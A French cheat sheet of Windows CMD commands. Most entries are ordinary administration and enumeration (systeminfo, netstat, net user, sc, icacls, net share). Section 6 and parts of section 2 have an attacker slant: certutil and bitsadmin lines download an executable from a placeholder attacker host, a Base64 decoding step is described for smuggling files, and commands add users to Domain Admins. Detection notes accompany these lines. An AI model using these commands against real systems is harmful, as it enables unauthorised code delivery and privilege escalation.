# CMD Windows — fiche de triche terrain

---

## 1. Informations système & réseau

```cmd
systeminfo                              :: Affiche OS, build, hotfix, RAM, domaine, uptime
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   :: Filtre uniquement OS et version
hostname                                :: Affiche le nom de la machine locale
```

```cmd
ipconfig /all                           :: Détail complet : IP, masque, passerelle, DNS, MAC, DHCP
ipconfig /displaydns                    :: Affiche le cache DNS résolu localement
ipconfig /flushdns                      :: Vide le cache DNS local
```

```cmd
route print                             :: Affiche la table de routage IPv4/IPv6 locale
```

```cmd
netstat -ano                            :: Connexions actives avec PID associé (-a: tout, -n: numérique, -o: PID)
netstat -ano | findstr :443             :: Filtre les connexions sur un port précis
netstat -anob                           :: Ajoute le nom de l'exécutable (nécessite droits admin)
```

```cmd
arp -a                                  :: Affiche la table ARP locale (correspondances IP/MAC)
```

!!! tip "Combiner avec findstr"
    `findstr` (équivalent Windows de `grep`) est le compagnon naturel de `systeminfo`, `netstat` et `tasklist` pour filtrer une sortie volumineuse directement en ligne de commande.

---

## 2. Gestion des utilisateurs & groupes

```cmd
net user                                :: Liste les comptes utilisateurs locaux
net user <nom>                          :: Détaille un compte local (droits, expiration, groupes)
net user <nom> /domain                  :: Détaille un compte utilisateur du domaine Active Directory
net user <nom> <mdp> /add               :: Crée un nouveau compte utilisateur local
```

```cmd
net localgroup administrators           :: Liste les membres du groupe Administrateurs local
net localgroup administrators <nom> /add :: Ajoute un utilisateur au groupe Administrateurs local
```

```cmd
net group "Domain Admins" /domain       :: Liste les membres du groupe Admins du domaine
net group "Domain Admins" /domain /add  :: Ajoute un utilisateur au groupe Domain Admins (droits requis)
```

!!! warning "Traçabilité"
    Toute modification de groupe privilégié (`administrators`, `Domain Admins`) est généralement journalisée côté contrôleur de domaine (Event ID 4728/4732) et déclenche des alertes SOC courantes.

---

## 3. Processus & services

```cmd
tasklist                                :: Liste tous les processus actifs avec leur PID
tasklist /v                             :: Ajoute le nom de session et l'utilisateur propriétaire
tasklist /svc                           :: Affiche les services hébergés par chaque processus
tasklist | findstr /i "chrome"          :: Filtre par nom de processus (insensible à la casse)
```

```cmd
taskkill /F /PID 1234                   :: Termine un processus par PID (/F = forcé)
taskkill /F /IM notepad.exe             :: Termine un processus par nom d'image (/IM)
```

```cmd
sc query                                :: Liste tous les services et leur état actuel
sc query <nom_service>                  :: Détail de l'état d'un service précis
sc qc <nom_service>                     :: Affiche la configuration d'un service (binaire, démarrage)
sc config <nom_service> start= auto     :: Modifie le mode de démarrage d'un service (espace requis après =)
sc start <nom_service>                  :: Démarre un service
sc stop <nom_service>                   :: Arrête un service
```

!!! warning "Syntaxe sc config"
    `sc config` exige un espace après chaque `=` (ex : `start= auto`, pas `start=auto`), sous peine d'erreur de syntaxe silencieuse.

---

## 4. Fichiers, dossiers & permissions

```cmd
dir /a                                  :: Liste fichiers/dossiers, y compris cachés et système
dir /a /s                               :: Liste récursive sur toute l'arborescence
tree /f                                 :: Affiche l'arborescence complète avec les fichiers
```

```cmd
icacls C:\chemin                        :: Affiche les permissions NTFS effectives sur un chemin
icacls C:\chemin /grant utilisateur:F   :: Accorde le contrôle total (F) à un utilisateur
icacls C:\chemin /grant utilisateur:(OI)(CI)F  :: Applique récursivement aux sous-dossiers/fichiers
icacls C:\chemin /remove utilisateur    :: Retire toutes les permissions explicites d'un utilisateur
icacls C:\chemin /reset                 :: Réinitialise aux permissions héritées par défaut
```

```cmd
takeown /f C:\chemin                    :: Prend possession d'un fichier ou dossier (droits admin)
takeown /f C:\chemin /r /d y            :: Prise de possession récursive, confirmation automatique
```

!!! tip "Ordre pour débloquer un fichier verrouillé"
    Sur un fichier système protégé, l'ordre classique est `takeown` (devenir propriétaire) puis `icacls ... /grant` (s'octroyer les droits), les deux étant généralement nécessaires ensemble.

---

## 5. Partages & connexions réseau

```cmd
net share                               :: Liste les partages réseau exposés par la machine locale
net share NomPartage=C:\chemin /grant:tout,FULL  :: Crée un nouveau partage réseau
net share NomPartage /delete            :: Supprime un partage existant
```

```cmd
net use                                 :: Liste les connexions réseau (lecteurs mappés) actives
net use Z: \\serveur\partage            :: Monte un partage distant sur le lecteur Z:
net use Z: \\serveur\partage /user:domaine\utilisateur motdepasse  :: Avec authentification explicite
net use Z: /delete                      :: Déconnecte le lecteur réseau mappé
```

---

## 6. Transfert de fichiers & exécution

```cmd
certutil -urlcache -f http://attaquant.com/fichier.exe fichier.exe
:: Télécharge un fichier distant via HTTP, détourné de son usage certificat original

certutil -decode fichier.b64 fichier.exe
:: Décode un fichier Base64 en binaire (utile pour exfiltrer/infiltrer via presse-papier ou copier-coller)
```

```cmd
bitsadmin /transfer myJob http://attaquant.com/fichier.exe C:\Windows\Temp\fichier.exe
:: Télécharge un fichier via le service BITS (Background Intelligent Transfer Service)
```

!!! warning "Détection EDR/SOC"
    `certutil -urlcache` et `bitsadmin` figurent parmi les techniques LOLBins (Living Off The Land Binaries) les plus surveillées : leur usage hors contexte de gestion de certificats ou de mise à jour Windows déclenche fréquemment des alertes sur un EDR correctement configuré.
